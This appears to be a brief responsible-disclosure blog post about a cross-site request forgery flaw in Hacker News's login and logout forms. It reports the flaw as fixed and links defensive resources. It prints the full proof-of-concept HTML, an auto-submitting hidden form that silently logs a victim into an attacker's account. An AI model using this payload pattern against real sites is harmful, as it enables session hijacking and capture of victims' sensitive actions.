On February 17th, I discovered a session riding vulnerability on the login and logout forms of Hacker News. It was a textbook cross site request forgery (CSRF), triggered by clicking an article posted by the attacker.

The attack worked like this:

1. Attacker submits a title like "CSRF And You (2008)" with a URL that points to the exploit code.
2. User clicks on interesting article.
3. User is logged out of account, silently logged into an attacker-controlled account, and sent to the comments section.
4. User reads comments section for interesting article.
5. User does other, more sensitive actions in the attacker-controlled account (apply for YC? change email? add credit card? make brilliant karma-rich submission?).

The exploit code looked like this:

    <body onload="document.getElementById('csrf_demo').submit()" style="display:none;">
      <img src="https://news.ycombinator.com/logout" />
      <form id="csrf_demo" action="https://news.ycombinator.com/login" method="post">
        <input name="goto" value="item?id=11122018">
        <input name="acct" value="csrf">
        <input name="pw" value="password">
      </form>
    </body>

I contacted Dan at Hacker News and the team immediately patched the vulnerabilities. This attack no longer works as described above.

To learn more about CSRF and how to protect your site against attacls like this one, read Jeff Atwood's excellent [CSRF and You (2008)](http://blog.codinghorror.com/cross-site-request-forgeries-and-you/) and review the [OWASP Wiki on CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)).
